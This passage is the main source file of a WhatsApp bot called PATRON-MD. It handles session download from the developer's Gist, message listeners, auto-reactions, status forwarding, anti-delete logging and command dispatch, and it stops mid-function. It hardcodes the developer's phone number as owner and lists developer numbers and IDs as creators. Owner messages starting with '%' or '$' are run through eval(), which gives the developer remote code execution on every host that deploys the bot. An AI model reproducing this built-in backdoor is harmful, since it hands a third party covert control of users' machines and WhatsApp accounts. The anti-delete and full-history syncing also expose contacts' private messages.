// --- Automatic sqlite3 fix  ---
const fs = require('fs');
const { execSync } = require('child_process');
const path = require('path');
const axios = require('axios');
const { loadAntiTagSW, saveAntiTagSW } = require('./plugins/antitagsw');

function checkSqlite3Binding() {
    const nodeAbi = process.versions.modules;
    const bindingPaths = [
        path.join(__dirname, 'node_modules', 'sqlite3', 'build', 'Release', 'node_sqlite3.node'),
        path.join(__dirname, 'node_modules', 'sqlite3', 'lib', 'binding', `node-v${nodeAbi}-` + process.platform + '-' + process.arch, 'node_sqlite3.node')
    ];
    return bindingPaths.some(fs.existsSync);
}

function fixSqlite3() {
    try {
        console.log('[startup] Attempting to rebuild sqlite3...');
        execSync('npm rebuild sqlite3', { stdio: 'inherit' });
    } catch (e) {
        console.log('[startup] npm rebuild failed, trying build-from-source...');
        try {
            execSync('npm install sqlite3 --build-from-source', { stdio: 'inherit' });
        } catch (err) {
            console.error('[startup] Failed to build sqlite3:', err);
            process.exit(1);
        }
    }
}

if (!checkSqlite3Binding()) {
    fixSqlite3();
} else {
    console.log('[startup] sqlite3 native binding found.');
}
// --- End of automatic fix ---

const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('baileys-mod')
  
  const { saveMessage, getMessage } = require('./messageStore');
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount } = require('./data')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const nodecron = require('node-cron');
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const prefix = config.PREFIX
  const { setupLinkDetection } = require("./lib/events/antilinkDetection");
  const { registerGroupMessages } = require('./plugins/groupMessages');
  const { isCreator, setUdp } = require('./plugins/sudo-management');
  const { getWarnings, addWarning, resetWarnings } = require("./lib/warnings");
  
  const ownerNumber = ['2348133729715']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
// Utility to fetch a session.json from a Gist ID and save to sessions/creds.json
async function fetchAndSaveSessionFromGist(gistId) {
    const sessionDir = path.join(__dirname, 'sessions');
    const credsPath = path.join(sessionDir, 'creds.json');

    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }
    try {
        const url = `https://gist.githubusercontent.com/Itzpatron/${gistId}/raw/session.json`;
        const response = await axios.get(url);
        const data = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        await fs.promises.writeFile(credsPath, data);
        return true;
    } catch (error) {
        console.error('❌ Failed to fetch or save session from Gist:', error.message);
        return false;
    }
}

async function downloadSessionData() {
    const sessionDir = path.join(__dirname, 'sessions');
    const credsPath = path.join(sessionDir, 'creds.json');
    if (!config.SESSION_ID) {
        console.error('❌ Please add your session to SESSION_ID env !!');
        return false;
    }

    if (fs.existsSync(credsPath)) {
        console.log('✅ Session file already exists.');
        return true;
    }

    try {
        let sessdata = config.SESSION_ID.split("PATRON-MD~")[1] || config.SESSION_ID;
        // Use the utility to fetch and save the session
        const result = await fetchAndSaveSessionFromGist(sessdata);
        if (result) {
            console.log('✅ Session downloaded');
        }
        return result;
    } catch (error) {
        console.error('❌ Failed to download session data:', error.message);
        return false;
    }
}
  
  //=============================================
  
let conn = null; // Make conn accessible for cleanup

async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()

  if (conn && conn.ev && conn.ev.removeAllListeners) {
    conn.ev.removeAllListeners();
  }

  conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version,
          getMessage: async (key) => getMessage(key) || undefined
          })
      
let retryCount = 0;
const maxRetries = 3;
const retryDelay = 3000; // 3 seconds delay between retries

conn.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'close') {
    const statusCode = lastDisconnect?.error?.output?.statusCode;
    const reason = lastDisconnect?.error?.output?.payload?.message || lastDisconnect?.error?.message || 'unknown';
    
    if (statusCode !== DisconnectReason.loggedOut) {
      if (retryCount < maxRetries) {
        retryCount++;
        console.log(`[WA] Connection closed. Retrying (${retryCount}/${maxRetries}) in 3s... Reason: ${reason}`);
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        connectToWA();
      } else {
        console.log(`[WA] Max retries (${maxRetries}) reached. Please provide new session ID and redeploy`);
        retryCount = 0;
      }
    } else {
      console.log('[WA] Session ended/Logged out - Please provide new session ID and redeploy');
    }
  } else if (connection === 'open') {
    retryCount = 0; // Reset retry counter on successful connection
  console.log('🧬 Installing Plugins')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('Plugins installed successful ✅')
  console.log('Bot connected to whatsapp ✅')

const up = `
🌟 *HELLO PATRON-MD USER* 🌟
  
🔧 *YOUR PREFIX:* [ ${prefix} ]
> *If bot isnt responding log out and get new session id and redeploy*

*NOTE: wait for some mins before bot works in groups afterwards do (${prefix}getlid) "on a group" to get your lid then do ${prefix}setlid (yourlid) to make commands work*

💻 *Use ${prefix}patron to see more information about the bot*\n

💎 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ: ᴘᴀᴛʀᴏɴＸ*

💡 *For any issues or complaints , please contact the developer:* 2348133729715
  `;
          
              try {
            await conn.sendMessage(conn.user.id, {
                image: { url: `https://files.catbox.moe/e71nan.png` },
                caption: up
            });
          } catch (imageError) {
            console.log('Failed to send image, falling back to text only:', imageError);
            // Fall back to sending just the text if image fails
            await conn.sendMessage(conn.user.id, {
                text: up
            });
          }
            }
          });
          
          conn.ev.on('creds.update', saveCreds);
          
          setupLinkDetection(conn);
          registerGroupMessages(conn);

  //==============================
  
conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });

  //============================== 
  conn.ev.on("messages.upsert", async ({ messages }) => {
    try {
      const m = messages[0];
      let message = m?.message;
      if (!message && m?.key) {
        // Try to fetch from local store
        message = await getMessage(m.key);
        if (!message) {
          // console.warn('[WARN] Skipped message with missing content and not found in store:', m.key);
          return;
        }
      }
      // Only save valid messages
      if (m.key && m.key.remoteJid && m.key.id) {
        saveMessage(m.key, { ...m, message });
      }
    } catch (err) {
      console.error('Error in message listener:', err);
    }
  });

  // Helper to extract text more efficiently
  function getMessageText(message) {
    if (!message) return "";
    
    // Direct text types first (fastest)
    if (message.conversation) return message.conversation;
    if (message.text) return message.text;
    
    // Then check extended types
    if (message.extendedTextMessage?.text) return message.extendedTextMessage.text;
    
    // Check media captions
    const mediaCaptions = ['imageMessage', 'videoMessage', 'documentMessage'];
    for (const type of mediaCaptions) {
      if (message[type]?.caption) return message[type].caption;
    }
    
    // Check view once messages
    if (message.viewOnceMessage?.message) {
      const vType = message.viewOnceMessage.message.imageMessage ? 'imageMessage' : 'videoMessage';
      if (message.viewOnceMessage.message[vType]?.caption) {
        return message.viewOnceMessage.message[vType].caption;
      }
    }
    
    // Check message context
    if (message.messageContextInfo?.message) {
      return getMessageText(message.messageContextInfo.message);
    }
    
    // Check button responses
    if (message.buttonsResponseMessage?.selectedButtonId) {
      return message.buttonsResponseMessage.selectedButtonId;
    }
    if (message.listResponseMessage?.singleSelectReply?.selectedRowId) {
      return message.listResponseMessage.singleSelectReply.selectedRowId;
    }
    if (message.templateButtonReplyMessage?.selectedId) {
      return message.templateButtonReplyMessage.selectedId;
    }

    return "";
}

conn.ev.on("messages.upsert", async ({ messages }) => {
    try {
        const m = messages[0];
        if (!m) return;
        
        // Get message content with optimized extraction
        let message = m.message;
        if (!message && m?.key) {
            message = await getMessage(m.key);
        }
        
        if (!message) return;

        // Get basic message info
        const sender = m.key?.participant || m.key?.remoteJid;
        const from = m.key?.remoteJid;
        const isGroup = from?.endsWith('@g.us');
        
        // Extract text using optimized function
        const text = getMessageText(message).trim();
        
        // Get message type more efficiently
        const type = Object.keys(message).find(key => 
            !['senderKeyDistributionMessage', 'messageContextInfo'].includes(key)
        ) || "";

        // Enhanced logging with filtering
        if (type !== 'protocolMessage' && type !== 'senderKeyDistributionMessage') {
            console.log(`[MSG] Type: ${type} | Text: "${text}" | From: ${sender} | Group: ${isGroup}`);
            
            // Save valid messages
            if (m.key?.remoteJid && m.key?.id) {
                await saveMessage(m.key, { ...m });
            }
        }

    } catch (err) {
        console.error('Error in message listener:', err);
    }
});

// --- AntiTagSW Handler ---
conn.ev.on("messages.upsert", async ({ messages }) => {
  try {
    const m = messages[0];
    if (!m || !m.message) return;
    const chatId = m.key.remoteJid;
    if (!chatId.endsWith('@g.us')) return; // Only groups
    const antiTagSWGroup = loadAntiTagSW();
    if (!antiTagSWGroup[chatId]) return; // Not enabled
    if (m.key.fromMe) return;

    // Detect status tagging
    const type = m.message ? Object.keys(m.message)[0] : "";
    if (type !== "messageContextInfo" && type !== "groupStatusMentionMessage") return;

    // Robust tagger extraction
    const tagger = m.key.participant || m.participant || m.sender || m.key.remoteJid;
    const metadata = await conn.groupMetadata(chatId).catch(() => null);
    if (!metadata) return;
    const participants = metadata.participants;
    
    // Get bot JIDs and check admin status properly
    const botJid = conn.user.id;
    const botJidSplit = botJid.split(":")[0] + "@s.whatsapp.net";
    const botObj = participants.find(p => p.id === botJid || p.lid === botJid || p.id === botJidSplit || p.lid === botJidSplit);
    const isBotAdmins =
        participants.some(p => p.id === botJid && (p.admin === 'admin' || p.admin === 'superadmin')) ||
        participants.some(p => p.id === botJidSplit && (p.admin === 'admin' || p.admin === 'superadmin')) ||
        (botObj && (participants.some(p => p.id === botObj.id && (p.admin === 'admin' || p.admin === 'superadmin'))));

    const isAdminSender = participants.some(p => p.id === tagger && (p.admin === 'admin' || p.admin === 'superadmin'));
    if (isAdminSender) return;

    // Delete the status tag message first
    try {
        await conn.sendMessage(chatId, { delete: m.key });
    } catch (err) {
        console.error('Error deleting status tag message:', err);
    }

    // Use warnings system
    const warnCount = addWarning(chatId, tagger);
    
    // Send warning message
    await conn.sendMessage(chatId, {
        text: `🚨 @${tagger.split("@")[0]}, do NOT tag this group in your status!\n⚠️ Warning ${warnCount}/3${warnCount >= 3 && isBotAdmins ? '\n\n🚫 Maximum warnings reached. You will be removed.' : ''}`,
        mentions: [tagger]
    });

    // If 3 warnings and bot is admin, remove the user
    if (warnCount >= 3 && isBotAdmins) {
        try {
            // Try to remove the user
            await conn.groupParticipantsUpdate(chatId, [tagger], 'remove');
            await conn.sendMessage(chatId, {
                text: `✅ @${tagger.split("@")[0]} has been removed for repeatedly tagging this group in their status.`,
                mentions: [tagger]
            });
            resetWarnings(chatId, tagger);
        } catch (err) {
            console.error('Error removing user:', err);
            await conn.sendMessage(chatId, {
                text: `❌ Failed to remove @${tagger.split("@")[0]}. They may be an admin.`,
                mentions: [tagger]
            });
        }
    }
  } catch (err) {
    console.error('Error in AntiTagSW message listener:', err);
  }
});

conn.ev.on("messages.upsert", async ({ messages }) => {
    try {
        const m = messages[0];
        if (!m?.message || m.key.fromMe) return;

        // Extract text
        const text = (
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            ""
        ).toLowerCase().trim();

        // NEW: Better status reply detection
        const isStatusReply = 
            m.key.remoteJid === "status@broadcast" || // Direct status view
            m.message?.extendedTextMessage?.contextInfo?.remoteJid === "status@broadcast"; // Status reply

        // Trigger words
        const triggerWords = ["send", "share", "snd", "give", "forward"];
        const shouldForward = triggerWords.some(word => text.includes(word));

        if (!isStatusReply || !shouldForward) return;

        // Get the quoted status
        const statusMessage = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
        
        if (!statusMessage) {
            console.log("No quoted status found");
            return;
        }

        // Forward with proper attribution
        await conn.sendMessage(
            m.key.remoteJid, 
            { 
                forward: {
                    key: {
                        remoteJid: "status@broadcast",
                        id: m.message.extendedTextMessage.contextInfo.stanzaId
                    },
                    message: statusMessage
                }
            },
            { quoted: m }
        );

    } catch (err) {
        console.error("Error forwarding status:", err);
    }
});

const pfilter = JSON.parse(fs.readFileSync('./lib/pfilter.json'));
const gfilter = JSON.parse(fs.readFileSync('./lib/gfilter.json'));

conn.ev.on('messages.upsert', async (mek) => {
  try {
      const m = mek.messages[0];
      if (!m.message) return;
      const from = m.key.remoteJid;
      const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
      const isGroup = from.endsWith("@g.us");

      const text = body.toLowerCase();

      // Ensure filters work in private mode
      if (config.MODE === "private" && !isGroup) {
          for (let key in pfilter) {
              if (text.includes(key)) {
                  await conn.sendMessage(from, { text: pfilter[key] }, { quoted: m });
                  break; // stop checking once a match is found
              }
          }
      } else if (isGroup) {
          for (let key in gfilter) {
              if (text.includes(key)) {
                  await conn.sendMessage(from, { text: gfilter[key] }, { quoted: m });
                  break; // stop checking once a match is found
              }
          }
      }
  } catch (err) {
      console.error(err);
  }
});

// --- Squid Game Message Listener ---
const gameState = globalThis.squidGameState || (globalThis.squidGameState = {});
let squidGameListenerAdded = false;
function attachSquidGameListener(conn) {
  if (squidGameListenerAdded) return;
  squidGameListenerAdded = true;
  
  // Helper to get bot JID
  let botJid = null;
  setTimeout(() => {
    try {
      botJid = conn.user?.id || null;
    } catch {}
  }, 2000);

  conn.ev.on("messages.upsert", async (msg) => {
    const m = msg.messages?.[0];
    if (!m?.message || !m.key.remoteJid) return;
    const chatId = m.key.remoteJid;
    const sender = m.key.participant || m.key.remoteJid;
    const game = gameState[chatId];
    if (!game || game.status !== "started") return;
    if (!game.players.some(p => p.id === sender)) return;
    // Ignore messages actually sent by the bot (not just fromMe, but by JID)
    if (botJid && sender === botJid) return;

    // --- Green Light Tracker ---
    if (game.currentLight === "green") {
      if (!game.activeThisRound) game.activeThisRound = new Set();
      game.activeThisRound.add(sender);
      game.scores[sender] = (game.scores[sender] || 0) + 1;
      if (game.scores[sender] >= 50) {
        clearInterval(game.interval);
        game.status = "ended";
        await conn.sendMessage(chatId, {
          text: `🏁 *Winner: @${sender.split("@")[0]}!* 🎉\nYou reached 50 messages and won the Squid Game!`,
          mentions: [sender]
        });
        delete gameState[chatId];
      }
    }
    // --- Red Light ---
    else if (game.currentLight === "red") {
      game.players = game.players.filter(p => p.id !== sender);
      delete game.scores[sender];
      await conn.sendMessage(chatId, {
        text: `💀 @${sender.split("@")[0]} was eliminated for speaking during 🟥 *Red Light*!`,
        mentions: [sender]
      });
      if (game.players.length === 1) {
        clearInterval(game.interval);
        game.status = "ended";
        const winner = game.players[0];
        await conn.sendMessage(chatId, {
          text: `🏆 *Last survivor: @${winner.id.split("@")[0]}!*`,
          mentions: [winner.id]
        });
        delete gameState[chatId];
      }
    }
  });

  // Patch: Eliminate silent players after each Green Light
  // Patch the game loop in plugins/game.js to call this after each green light:
  // eliminateSilentPlayers(conn, chatId)
  global.eliminateSilentPlayers = async function(conn, chatId) {
    const game = gameState[chatId];
    if (!game || !game.activeThisRound) return;
    const silent = game.players.filter(p => !game.activeThisRound.has(p.id));
    for (const p of silent) {
      game.players = game.players.filter(player => player.id !== p.id);
      delete game.scores[p.id];
      await conn.sendMessage(chatId, {
        text: `😴 @${p.id.split("@")[0]} was eliminated for staying silent during 🟩 *Green Light*!`,
        mentions: [p.id]
      });
    }
    game.activeThisRound = null;
    // If only one player left, declare winner
    if (game.players.length === 1) {
      clearInterval(game.interval);
      game.status = "ended";
      const winner = game.players[0];
      await conn.sendMessage(chatId, {
        text: `🏆 *Last survivor: @${winner.id.split("@")[0]}!*`,
        mentions: [winner.id]
      });
      delete gameState[chatId];
    }
  }
}

// --- End Squid Game Listener ---

//=============readstatus=======
        
conn.ev.on('messages.upsert', async(mek) => {
  mek = mek.messages[0]
  if (!mek.message) return
  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
  ? mek.message.ephemeralMessage.message 
  : mek.message;
  //console.log("New Message Detected:", JSON.stringify(mek, null, 2)
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🚹', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩'
    ];

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Patron-md'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await getGroupMetadataWithLimit(conn, from).catch(e => {
    console.error('Failed to fetch groupMetadata:', e);
    return undefined;
  }) : ''
  const groupName = isGroup && groupMetadata && groupMetadata.subject ? groupMetadata.subject : ''
  const participants = isGroup && groupMetadata && groupMetadata.participants ? groupMetadata.participants : ''
  const groupAdmins = isGroup && participants ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
 const udp = botNumber.split('@')[0];
 setUdp(udp);
const jawad = ['2348025532222', '2348133729715', '124236760916111@lid', '24640781058226@lid'];
const devFilePath = path.join(__dirname, 'lib', 'dev.json');
let devList = [];
if (fs.existsSync(devFilePath)) {
    devList = JSON.parse(fs.readFileSync(devFilePath, 'utf-8'));
}
const extraCreators = [
  ...jawad,
  ...(devList.map(jid => jid.replace(/@s\.whatsapp\.net$/, ''))),
  ...(config.lid ? config.lid.split(',').map(lid => lid.trim()) : [])];

function isCreator(jid) {
  if (!jid) return false;
  
  // Handle LID format
  if (jid.includes('@lid')) {
    // Remove @lid if present
    const plainLid = jid.replace('@lid', '');
    // Check if the LID is in config.LID
    if (config.lid) {
      const configLids = config.lid.split(',').map(lid => lid.trim());
      if (configLids.includes(plainLid)) return true;
    }
  }

  // Handle regular phone numbers
  const plain = jid.replace(/@s\.whatsapp\.net$/, '');
  return (
    extraCreators.includes(plain) ||
    devList.includes(jid) ||
    (typeof udp !== 'undefined' && udp && (plain === udp))
  );
}

    if (isOwner && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isOwner && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
// Owner react for both private and group chats
if ((senderNumber.includes("2348133729715") || sender === "24640781058226@lid" || m.key.remoteJid === "24640781058226@lid") && !isReact) {
  m.react("🚹");
}


  //==========public react============//
  
// Auto React for all messages (public and owner)
if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = [
        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🚹🚹', 
        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🚹', '❤️', '🧡', '💛', '💚', 
        '🚹', '💙', '💜', '🚹', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
          
// custum react settings        
                        
// Custom React for all messages (public and owner)
if (!isReact && config.CUSTOM_REACT === 'true') {
    // Use custom emojis from the configuration (fallback to default if not set)
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
        
  //==========WORKTYPE============ 
  if(!isOwner && !isCreator(sender) && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
// Add error handling and ensure isCreator is accessible
if (events && events.commands) {
    events.commands.map(async (command) => {
        try {
            if (body && command.on === "body") {
                command.function(conn, mek, m, {
                    from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator: isCreator(sender), groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply
                });
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m, {
                    from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator: isCreator(sender), groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply
                });
            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                command.function(conn, mek, m, {
                    from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator: isCreator(sender), groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply
                });
            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                command.function(conn, mek, m, {
                    from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator: isCreator(sender), groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply
                });
            }
        } catch (error) {
            console.error("[COMMAND ERROR]", error);
        }
    });
}
  });
// Ensure the bot responds to authorized users in private mode
conn.ev.on('messages.upsert', async (mek) => {
    const m = mek.messages[0];
    if (!m?.message) return;

    const from = m.key.remoteJid; 
    const isGroup = from.endsWith("@g.us");
    const sender = m.key.participant || m.key.remoteJid;
    const isOwner = ownerNumber.includes(sender.split('@')[0]);
    
    // Check if sender's number matches any lid in the list with improved handling
    const isAuthorizedLid = config.lid && config.lid.split(',').map(lid => lid.trim()).some(lid => {
        // Handle direct LID matches (for messages coming with @lid format)
        if (sender.endsWith('@lid')) {
            return sender === lid || sender === lid + '@lid';
        }
        
        // For regular WhatsApp numbers, compare the numeric portions
        const senderNum = sender.replace(/[^0-9]/g, '');
        const lidNum = lid.replace(/[^0-9]/g, '');
        return senderNum === lidNum;
    });
    // Allow owner, creator and lid users in private mode
    if (config.MODE === "private") {
        if (isOwner || isCreator(sender) || isAuthorizedLid) {
        } else {
            return;
        }
    }
    if (!isOwner && isGroup && config.MODE === "inbox") return; // Block group messages in inbox mode
    if (!isOwner && !isGroup && config.MODE === "groups") return; // Block private messages in groups mode

    // Command handling is now managed by the cmd system
});

// Rate limiting implementation for group metadata
const groupMetadataCache = new Map();
const metadataRequests = new Map();
const RATE_LIMIT = {
    windowMs: 60000, // 1 minute
    maxRequests: 45,  // Maximum requests per minute
    cacheTime: 300000 // 5 minutes cache
};

async function getGroupMetadataWithLimit(conn, jid) {
    const now = Date.now();
    
    // Check cache first
    if (groupMetadataCache.has(jid)) {
        const cached = groupMetadataCache.get(jid);
        if (now - cached.timestamp < RATE_LIMIT.cacheTime) {
            return cached.data;
        }
    }
    
    // Initialize or clean up request tracking
    if (!metadataRequests.has(jid)) {
